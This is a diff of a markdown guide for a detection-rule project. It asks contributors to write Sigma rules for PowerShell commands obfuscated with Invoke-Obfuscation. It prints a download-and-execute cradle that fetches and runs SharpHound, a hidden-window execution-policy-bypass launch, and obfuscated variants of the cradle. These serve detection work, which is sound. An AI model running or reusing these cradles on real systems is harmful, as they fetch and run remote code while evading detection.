@@ -2,16 +2,23 @@
 This is your guide on how you can help us all with soving this issue.     
 You can pick up some of the methods of PowerShell command and script obfuscation provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
-### Original command (before obfuscation)
+### Original command #1 (before obfuscation)
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+```
+### Original command #2 (before obfuscation)
+```powershell
+powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
 ```
 
 ### Invoke-Obfuscation module premise
 ```powershell
 Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
+### Oremise for command #1 ###
 SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+### Oremise for command #2 ###
+SET SCRIPTBLOCK powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
 ```
 #### Just pick the obfuscation method and the relevant сases you prefer and develop Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the case numbers you've solved:  
 (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/>
@@ -41,7 +48,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### TOKEN OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-| Case # | Option #1 | Option #2 | Option #3 | Result |
+| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
 | :---: | :---: | :---: | :---: | :--- |
 | 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound 
 | 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(("{16}{2}{17}{26}{10}{0}{3}{19}{7}{9}{6}{5}{8}{20}{23}{4}{18}{12}{24}{22}{11}{1}{25}{21}{13}{15}{14}"-f 'ntent.com/Blo','s/','/','o','441','ea5363870','nd/a7','ood','d92','Hou','.githubuserco','Ingestor','38b','und.p','1','s','https:','/r','a361f','dHoundAD/Bl','5bc3','o','aadd0b/','1d3a','0','SharpH','aw')); Invoke-BloodHound 
